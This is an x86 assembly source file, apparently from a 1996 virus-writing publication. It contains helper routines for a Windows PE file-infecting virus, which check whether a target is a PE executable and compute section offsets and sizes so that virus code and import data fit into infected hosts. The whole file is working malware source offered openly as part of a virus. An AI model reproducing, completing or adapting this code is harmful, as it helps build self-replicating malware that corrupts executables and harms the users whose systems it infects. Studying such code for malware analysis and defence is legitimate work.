;(C) 1996 American Eagle Publications, Inc. All rights reserved.
;******************************************************************************
;Various simple utility functions used by the virus.

;This routine adjusts the rva in eax as necessary, depending on where it is
;in the file and how much room is needed for the virus code and idata. It
;does not alter anything but eax.
ADJUST_RVA:
        push    ebx
        cmp     eax,[ebp+esi+40]        ;compare with entry point
        jc      AR1                     ;no adjust needed, just exit
        mov     ebx,eax
        call    GET_VMSIZE
        add     eax,ebx
AR1:    cmp     eax,[ebp+END_IDATA]     ;compare with original end of idata
        jc      ARX                     ;no further adjust needed
        mov     ebx,eax
        call    GET_IMSIZE
        add     eax,ebx
ARX:    pop     ebx
        ret


;This routine is called with a pointer to a section name in ebx, and it
;returns a pointer to the respective section header in ebx, or, if it can't
;be found, with ebx=0. If found, it also returns the section number in ecx.
FIND_SEC_HDR:
        push    edi
        mov     edi,ebx                 ;put string pointer in edi
        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;get section count
        dec     ecx
FSHL1:  push    ecx
        call    GET_SEC_PTR             ;pointer to section header
        push    edi                     ;save pointer while comparing
FSHL2:  mov     al,[edi]
        or      al,al                   ;done with compare?
        jz      FSH3                    ;yes--a match!
        cmp     al,[ebp+ebx]            ;same as specified?
        jnz     FSH1                    ;nope, not a match, try next section
        inc     edi
        inc     ebx
        jmp     FSHL2

FSH1:   pop     edi
        pop     ecx
        or      ecx,ecx
        jz      FSH2                    ;no more sections to check, so quit
        dec     ecx                     ;else check them
        jmp     FSHL1
FSH2:   xor     ebx,ebx                 ;nope, done, so zero ebx
        pop     edi
        ret                             ;exit if no reloc section found

FSH3:   pop     edi
        pop     ecx
        pop     edi
        push    ecx
        call    GET_SEC_PTR             ;set ebx up properly
        pop     ecx                     ;as well as ecx
        ret

;This routine is passed an RVA for the file and it returns a file pointer in
;eax that corresponds to the address in the EXE file where that RVA is located.
RVA_TO_FILEPTR:
        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;get section count
RTF1:   dec     ecx
        push    eax
        call    GET_SEC_PTR             ;get pointer to section header
        pop     eax
        cmp     eax,[ebp+ebx+12]        ;check virtual @ of this section
        jnc     RTF2                    ;if eax>=rva of section, then this is proper section
        or      ecx,ecx                 ;section number 0?
        jnz     RTF1                    ;no, check next section
        xor     eax,eax
        ret                             ;return with error
RTF2:   sub     eax,[ebp+ebx+12]        ;eax = distance from start of section
        add     eax,[ebp+ebx+20]        ;add distance to start of section
        ret


;This routine takes a section number in ecx and returns a pointer to be used
;with ebp in ebx that points to the start of the section header for the
;requested section. (e.g. mov eax,[ebp+ebx] would get first 4 chars of section
;name.) It assumes that esi points to the PE header
GET_SEC_PTR:
        mov     eax,SEC_SIZE
        mul     ecx                     ;eax=pointer to start of section hdr ecx
        add     eax,PE_SIZE             ;    from end of PE header
        add     eax,esi
        mov     ebx,eax                 ;ebp+ebx points to section header
        ret

;This checks the opened file with handle in FHANDLE to see if it is a PE-style
;executable or not. If not, it returns with NZ set, otherwise Z is set.
IS_PE_FILE:
        mov     ecx,FB_SIZE             ;read FB_SIZE bytes
        lea     edx,[ebp+HDRBUF ]       ;into this buffer
        call    FILE_READ               ;read file header information
        jz      IPEX                    ;exit on error

        cmp     BYTE PTR [ebp+HDRBUF +18H],40H  ;valid extended header?
        jc      IPEX
        mov     ax,[ebp+HDRBUF+3CH]     ;now find the PE header
        cmp     ax,FB_SIZE              ;make sure we don't overflow stack
        jge     IPEX
        cwde                            ;eax = offset into header where PE header starts
        mov     esi,HDRBUF
        add     esi,eax                 ;ebp+esi points to PE header
        mov     eax,[ebp+esi]           ;eax = PE header signature
        cmp     eax,'EP'                ;proper PE header?
        jne     IPEX                    ;nope, don't attempt to infect
        ret
IPEX:   mov     al,1
        or      al,al                   ;return with with nz set
        ret

;This routine takes the difference between memory and file space into account
;when making a memory size calculation. If the additional memory required by
;the virus CODE is zero, it returns zero.
GET_VMSIZE:
        push    ecx
        mov     eax,[ebp+OLD_RAW]       ;get original host SizeOfRawData
        mov     ecx,eax
        call    GET_MSIZE               ;convert it to an MSIZE
        sub     eax,ecx                 ;memory space available in section
        mov     ecx,eax
        mov     eax,VIR_SIZE
        call    GET_FSIZE               ;eax=virus size, in file blocks
        sub     eax,ecx                 ;virtual size requirement
        jnc     GVM1                    ;if eax>0 leave it alone
        xor     eax,eax                 ;else set eax=0
GVM1:   call    GET_MSIZE               ;turn it into a memory size
        pop     ecx
        ret

;This routine takes the difference between memory and file space into account
;when making a memory size calculation. If the additional memory required by
;the virus IMPORT DATA is zero, it returns zero.
GET_IMSIZE:
        push    ecx
        mov     eax,[ebp+OLD_IDATA]     ;get original host SizeOfRawData for .idata
        mov     ecx,eax
        call    GET_MSIZE               ;convert it to an MSIZE
        sub     eax,ecx                 ;memory space available in section
        mov     ecx,eax
        mov     eax,IDATA_SIZE
        call    GET_FSIZE               ;eax=virus size, in file blocks
        sub     eax,ecx                 ;virtual size requirement
        jnc     GIM1                    ;if eax>0 leave it alone
        xor     eax,eax                 ;else set eax=0
GIM1:   call    GET_MSIZE               ;turn it into a memory size
        pop     ecx
        ret


;This routine takes the value in eax and rounds it up to the next memory
;allocation unit size. It preserves all registers.
GET_MSIZE:
        push    ecx
        push    edx
        mov     ecx,[ebp+esi+56]        ;get SectionAlignment
        add     eax,ecx
        dec     eax                     ;eax=X+SectionAlignment+1
        xor     edx,edx
        div     ecx                     ;eax=(X+SectionAlignment+1)/SectionAlignment
        mul     ecx                     ;eax=desired result
        pop     edx
        pop     ecx
        ret

;This routine takes the value in eax and rounds it up to the next file
;allocation unit size. It preserves all registers.
GET_FSIZE:
        push    ecx
        push    edx
        mov     ecx,[ebp+esi+60]        ;get FileAlignment
        add     eax,ecx
        dec     eax                     ;eax=X+SectionAlignment+1
        xor     edx,edx
        div     ecx                     ;eax=(X+SectionAlignment+1)/SectionAlignment
        mul     ecx                     ;eax=desired result
        pop     edx
        pop     ecx
        ret

SEC_RSRC        DB      '.rsrc',0
SEC_IDATA       DB      '.idata',0
SEC_RELOC       DB      '.reloc',0
SEC_EDATA       DB      '.edata',0

CODE_SEC        EQU     00000020H       ;Flag values for section header
EXECUTABLE      EQU     20000000H
READABLE        EQU     40000000H

